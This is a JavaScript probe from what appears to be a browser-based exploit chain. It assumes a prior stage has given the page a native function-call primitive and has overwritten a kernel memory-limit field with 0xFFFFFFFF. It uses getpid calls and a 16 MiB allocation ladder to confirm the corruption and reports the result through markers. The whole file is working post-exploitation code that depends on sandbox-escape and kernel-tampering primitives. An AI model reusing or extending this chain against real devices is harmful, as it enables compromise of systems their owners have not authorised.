// FMEM budget ceiling probe — cross-page test of the +0x14 = 0xFFFFFFFF
// mutation left in place by fmem_max_v1. If the kernel consumed the
// mutated value as the browser app's memory max, this page (same
// WebProcess) should allocate far beyond the normal WebProcess ceiling.
// Ladder: 16 MiB blocks committed (write-strided), up to 256 MiB, each
// block in try/catch; result submitted after the ladder with held-block
// count. If the page OOMs mid-ladder, no capture — the block count in
// the markers (ppm5_block_N) localizes the ceiling. Markers 6 of 8.
// NOTE: probe assumes the chain was built in a prior command on this
// page (enqueued before it).
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress))
    throw new Error("chain_missing");
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("ppm5_preflight");
  var held = [];
  var log = [];
  var MB = 1048576;
  for (var b = 0; b < 16; b++) {
    phase = "block_" + b;
    mark("ppm5_block_" + b);
    try {
      var buf = new Uint8Array(16 * MB);
      for (var w = 0; w < 16 * MB; w += 4096) buf[w] = 0xaa;
      buf[16 * MB - 1] = 0xbb;
      if (buf[16 * MB - 1] !== 0xbb) throw new Error("commit_fail");
      held.push(buf);
      log.push("b" + b + ":ok");
    } catch (blockError) {
      log.push("b" + b + ":FAIL(" +
        String(blockError).slice(0, 40) + ")");
      break;
    }
  }
  mark("ppm5_ladder_done");
  var after = native.call("getpid", []);
  result = { id: "fmem_ceiling_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { held_mb: held.length * 16,
      blocks_ok: held.length,
      ladder: log.join(",").slice(0, 300),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "fmem_ceiling_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
